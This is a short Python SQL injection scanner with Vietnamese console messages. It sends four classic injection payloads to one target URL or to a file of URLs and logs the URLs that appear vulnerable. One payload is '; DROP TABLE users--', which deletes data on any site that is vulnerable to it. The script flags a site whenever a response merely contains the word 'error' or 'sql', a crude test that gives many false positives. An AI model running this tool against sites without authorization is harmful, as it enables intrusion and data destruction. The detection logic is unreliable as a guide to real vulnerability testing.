import requests  
import urllib.parse

def check_sqli(url):  
    print(f"[🔍] Đang kiểm tra: {url}")  

    payloads = [
        "' OR '1'='1", 
        "' UNION SELECT null,null--", 
        "' OR 'a'='a", 
        "'; DROP TABLE users--"
    ]

    with open("output.txt", "a") as f:  
        for payload in payloads:
            full_url = url + urllib.parse.quote(payload)  

            try:  
                res = requests.get(full_url, timeout=5)  

                if res.status_code in [403, 404, 500]:  
                    print(f"[❌] Server phản hồi lỗi {res.status_code}, có thể bị chặn.")  
                    continue  

                if "error" in res.text.lower() or "sql" in res.text.lower():  
                    result = f"[🔥] Dính SQLi với payload: {payload} trên {full_url}"
                    print(result)  
                    f.write(result + "\n")  
                else:  
                    print(f"[✅] Không phát hiện lỗi SQLi trên {full_url}")  

            except requests.exceptions.RequestException as e:  
                print(f"[❌] Lỗi kết nối hoặc timeout: {e}")  

if __name__ == "__main__":  
    choice = input("Nhập (1) để quét 1 URL, (2) để quét từ file: ").strip()

    if choice == "1":
        target = input("Nhập URL mục tiêu (vd: http://example.com/index.php?id=): ").strip()
        check_sqli(target)

    elif choice == "2":
        file_name = input("Nhập tên file chứa danh sách URL (vd: targets.txt): ").strip()
        try:
            with open(file_name, "r") as f:
                urls = f.readlines()
                for url in urls:
                    check_sqli(url.strip())
        except FileNotFoundError:
            print("[❌] File không tồn tại, kiểm tra lại đường dẫn!")
    else:
        print("[⚠] Lựa chọn không hợp lệ!")
